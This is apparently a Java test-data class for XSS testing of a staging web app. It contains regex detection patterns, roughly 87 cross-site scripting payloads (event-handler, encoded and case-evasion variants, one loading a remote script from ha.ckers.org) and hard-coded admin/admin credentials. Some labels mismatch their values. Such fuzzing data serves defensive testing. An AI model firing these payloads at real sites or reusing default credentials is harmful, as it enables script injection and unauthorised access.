package SecurityCheck;

public class SecurityTestData {
//public static String XSSLocator0=";alert(String.fromCharCode(88,83,83))";
//public static String XSSLocator1="alert(String.fromCharCode(88,83,83))";
//public static String XSSLocator2="></SCRIPT>><SCRIPT>alert(String.fromCharCode(88,83,83))";
//public static String XSSLocatorshort0="!--<XSS>=&{()}";

	
public String AppUrl ="http://ppmstage01:8080";
public  String UserName = "admin";
public  String Password ="admin";


public static  String XSSLocator_01="01 -- Spaces are allowed after script and between";
public  static String Value_01="&lt;/script[\\r\\n\\s]*>";


public  static String XSSLocator_02="02 -- [Spaces are allowed after alert and ()]";
public  static String Value_02="alert[\\r\\n\\s]*\\((.*?)\\)";


public  static String XSSLocator_03="03 -- [Spaces are allowed after confirm and ()]";
public  static String Value_03="confirm[\\r\\n\\s]*\\((.*?)\\)";


public  static String XSSLocator_04="04 -- [Spaces are allowed after eval and ()]";
public  static String Value_04="eval[\\r\\n\\s]*\\((.*?)\\)";


public static String XSSLocator_05="05 -- Spaces are allowed after onerror";
public static String Value_05="expression[\\r\\n\\s]*\\((.*?)\\)";



public static String XSSLocator_06="06 -- Spaces are allowed after onerror";
public static String Value_06="expression[\\r\\n\\s]*\\((.*?)\\)"; 	 
 
public static String XSSLocator_07="07 -- [Spaces are allowed after expression and ()]";
public static String Value_07="javascript[\\r\\n\\s]*:";	   	 
 

public static String XSSLocator_08="08 -- [Spaces are allowed after expression and ()]";
public static String Value_08="onerror[\\r\\n\\s]*=\\((.*?)\\)";

public static String XSSLocator_09="09 -- [Spaces are allowed after onload and values for src doesn't need";
public static String Value_09="prompt[\\r\\n\\s]*\\((.*?)\\)"; 	 
 

public static String XSSLocator_10="10 -- [Spaces are allowed after src and values for src doesn't need";
public static String Value_10="src[\\r\\n\\s]*=(.*?) ";   	 
	 
public static String XSSLocator_11="11 -- [Spaces are allowed after vbscript and :]";
public static String Value_11="vbscript[\\r\\n\\s]*:";	   	 
 

public static String XSSLocator_12="12 -- XSS Locator";
public static String Value_12=";alert(String.fromCharCode(88,83,83))";	 
 
    
public static String XSSLocator_13="13 -- XSS Locator";
public static String Value_13=";Alert(String.fromCharCode(88,83,83))";
 
   
public static String XSSLocator_14="14 -- XSS Locator 02";
public static String Value_14="alert(String.fromCharCode(88,83,83))";
 
   
public static String XSSLocator_15="15 -- XSS Locator (short)";
public static String Value_15="&apos;&apos; ;!--&quot;&gt;XSS>=&amp;{()}";
	 
public static String XSSLocator_16="16 -- No Filter Evasion";
public static String Value_16="&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT>";   	 
 

	 
public static String XSSLocator_17="17 -- No quotes and no semicolon";
public static String Value_17="&lt;IMG SRC=javascript:alert('XSS')>";	   	 

	 
public static String XSSLocator_18="18 -- Case insensitive XSS attack vector";
public static String Value_18="&lt;IMG SRC=JaVaScRiPt:alert('XSS')>";  	 
 
   
public static String XSSLocator_19="19 -- Malformed IMG tags";
public static String Value_19="&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT>alert(&quot;XSS&quot;)&lt;/SCRIPT&lt;&quot;&gt;&gt;";

public static String XSSLocator_20="20 -- IMG onerror and javascript alert encode";
public static String Value_20="&lt;img src=x onerror=&quot;&amp;&quot;";  	   	 
 
	 
public static String XSSLocator_21="21 -- Decimal HTML character references without trailing semicolons";
public static String Value_21="SRC=&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&gt;";	   	   	 
 
public static String XSSLocator_22="22 -- IMG Dynsrc";
public static String Value_22="&lt;IMG DYNSRC=&quot;javascript:alert('XSS')&quot;&gt;"; 	   	   	 
 
	 
public static String XSSLocator_23="23 -- Body OnLoad Java Script";
public static String Value_23="&lt;BODY ONLOAD=alert('XSS')>"; 	   	   	 


public static String XSSLocator_24="24 -- Body OnClick Event Java Script";
public static String Value_24="&lt;head&gt;&lt;script type=&quot;text/javascript&quot;&gt; function OnClickButton () { alert (&quot;You clicked on the button!&quot;);}&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;button onclick=&quot;OnClickButton ()&quot;&gt;Click on me!&lt;/button&gt;&lt;/body&gt;"; 	   	   	 
 

	 
public static String XSSLocator_25="25 -- ongotpointercapture";
public static String Value_25="&lt;script&gt;ongotpointercapture=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_26="26 -- hashchange";
public static String Value_26="&lt;script&gt;hashchange=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
	 
public static String XSSLocator_27="27 -- help";
public static String Value_27="&lt;script&gt;help=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
   
public static String XSSLocator_28="28 -- input";
public static String Value_28="&lt;script&gt;input=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 

public static String XSSLocator_29="29 -- invalid";
public static String Value_29="&lt;script&gt;invalid=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 

public static String XSSLocator_30="30 -- waiting";
public static String Value_30="&lt;script&gt;waiting=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
   

public static String XSSLocator_31="31 -- wheel";
public static String Value_31="&lt;script&gt;wheel=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 

public static String XSSLocator_32="33 -- onabort";
public static String Value_32="&lt;script&gt;onabort=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 

public static String XSSLocator_33="33 -- onactivate";
public static String Value_33="&lt;script&gt;onactivate=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 

	 
public static String XSSLocator_34="34 -- onafterprint";
public static String Value_34="&lt;script&gt;onafterprint=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
	 
public static String XSSLocator_35="35 -- onafterscriptexecute";
public static String Value_35="&lt;script&gt;onafterscriptexecute=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
   

public static String XSSLocator_36="36 -- onafterupdate";
public static String Value_36="&lt;script&gt;onafterupdate=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
	 
public static String XSSLocator_37="37 -- onafterupdate";
public static String Value_37="&lt;script&gt;onafterupdate=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
   

public static String XSSLocator_38="38 -- onautocompleteerror";
public static String Value_38="&lt;script&gt;onautocompleteerror=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_39="39 -- onariarequest";
public static String Value_39="&lt;script&gt;onariarequest=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
   
public static String XSSLocator_40="40 -- onanimationiteration";
public static String Value_40="&lt;script&gt;onanimationiteration=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_41="41 -- onabort";
public static String Value_41="&lt;script&gt;onabort=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
	 
public static String XSSLocator_42="42 -- onactivate";
public static String Value_42="&lt;script&gt;onactivate=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 	 
public static String XSSLocator_43="43 -- onafterprint";
public static String Value_43="&lt;script&gt;onafterprint=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_44="44 -- onafterscriptexecute";
public static String Value_44="&lt;script&gt;onafterscriptexecute=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_45="45 -- onafterupdate";
public static String Value_45="&lt;script&gt;onafterupdate=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_46="46 -- onanimationend";
public static String Value_46="&lt;script&gt;onanimationend=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_47="47 -- onanimationstart";
public static String Value_47="&lt;script&gt;onanimationstart=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
	 
public static String XSSLocator_48="48 -- onautocomplete";
public static String Value_48="&lt;script&gt;onautocomplete=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 	 
public static String XSSLocator_49="49 -- onbeforeactivate";
public static String Value_49="&lt;script&gt;onbeforeactivate=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_50="50 -- onbeforecopy";
public static String Value_50="&lt;script&gt;onbeforecopy=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_51="51 -- onbeforecut";
public static String Value_51="&lt;script&gt;onbeforecut=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;";

public static String XSSLocator_52="52 -- onbeforecut";
public static String Value_52="&lt;script&gt;onbeforecut=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_53="53 -- onbeforedeactivate";
public static String Value_53="&lt;script&gt;onbeforedeactivate=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_54="54 -- onbeforeeditfocus";
public static String Value_54="&lt;script&gt;onbeforeeditfocus=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 

public static String XSSLocator_55="55 -- onbeforeprint";
public static String Value_55="&lt;script&gt;onbeforeprint=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 	 
public static String XSSLocator_56="56 -- onbeforescriptexecute";
public static String Value_56="&lt;script&gt;onbeforescriptexecute=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 

public static String XSSLocator_57="57 -- onbeforeunload";
public static String Value_57="&lt;script&gt;onbeforeunload=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
     
public static String XSSLocator_58="58 -- onbeforeupdate";
public static String Value_58="&lt;script&gt;onbeforeupdate=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
    
public static String XSSLocator_59="59 -- onbegin";
public static String Value_59="&lt;script&gt;onbegin=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 

public static String XSSLocator_60="60 -- onblur";
public static String Value_60="&lt;script&gt;onblur=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_61="61 -- onbounce";
public static String Value_61="&lt;script&gt;onbounce=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_62="62 -- oncancel";
public static String Value_62="&lt;script&gt;oncancel=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_63="63 -- oncanplay";
public static String Value_63="&lt;script&gt;oncanplay=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_64="64 -- oncanplaythrough";
public static String Value_64="&lt;script&gt;oncanplaythrough=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_65="65 -- oncancellchange";
public static String Value_65="&lt;script&gt;oncancellchange=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
    
public static String XSSLocator_66="66 -- onchange";
public static String Value_66="&lt;script&gt;onchange=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
	 
public static String XSSLocator_67="67 -- Body OnClick Event Java Script";
public static String Value_67="&lt;script&gt;onclick=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
    
public static String XSSLocator_68="68 -- onclose";
public static String Value_68="&lt;script&gt;onclose=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
  
	 
public static String XSSLocator_69="69 -- oncommand";
public static String Value_69="&lt;script&gt;oncommand=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
	 
public static String XSSLocator_70="70 -- oncontextmenu";
public static String Value_70="&lt;script&gt;oncontextmenu=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
   
public static String XSSLocator_71="71 -- oncontrolselect";
public static String Value_71="&lt;script&gt;oncontrolselect=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 	
public static String XSSLocator_72="72 -- oncopy";
public static String Value_72="&lt;script&gt;oncopy=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 

public static String XSSLocator_73="73 -- oncuechange";
public static String Value_73="&lt;script&gt;oncuechange=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
    
public static String XSSLocator_74="74 -- oncut";
public static String Value_74="&lt;script&gt;oncut=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
   
public static String XSSLocator_75="75 -- ondataavailable";
public static String Value_75="&lt;script&gt;ondataavailable=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 	
public static String XSSLocator_76="76 -- ondatasetchanged";
public static String Value_76="&lt;script&gt;ondatasetchanged=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
	 
public static String XSSLocator_77="77 -- ondatasetcomplete";
public static String Value_77="&lt;script&gt;ondatasetcomplete=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
   
	 	 
public static String XSSLocator_78="78 -- ondblclick";
public static String Value_78="&lt;script&gt;ondblclick=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
public static String XSSLocator_79="79 -- ondeactivate";
public static String Value_79="&lt;script&gt;ondeactivate=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
   
 	 
public static String XSSLocator_80="80 -- ondevicelight";
public static String Value_80="&lt;script&gt;ondevicelight=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
   

public static String XSSLocator_81="81 -- ondevicemotion";
public static String Value_81="&lt;script&gt;ondevicemotion=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
   
	
public static String XSSLocator_82="82 -- ondeviceorientation";
public static String Value_82="&lt;script&gt;ondeviceorientation=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
 

public static String XSSLocator_83="83 -- ondeviceproximity";
public static String Value_83="&lt;script&gt;ondeviceproximity=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 

   
 
public static String XSSLocator_84="84 -- ondrag";
public static String Value_84="&lt;script&gt;ondrag=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
	 
public static String XSSLocator_85="85 -- ondrag-drop";
public static String Value_85="&lt;script&gt;ondragdrop=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
   
public static String XSSLocator_86="86 -- ondrag-end";
public static String Value_86="&lt;script&gt;ondragend=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 
   	 
public static String XSSLocator_87="87 -- ondrag-enter";
public static String Value_87="&lt;script&gt;ondragenter=function() {alert(&quot;TestMe!!&quot;);}&lt;/script&gt;"; 	   	   	 
 

}
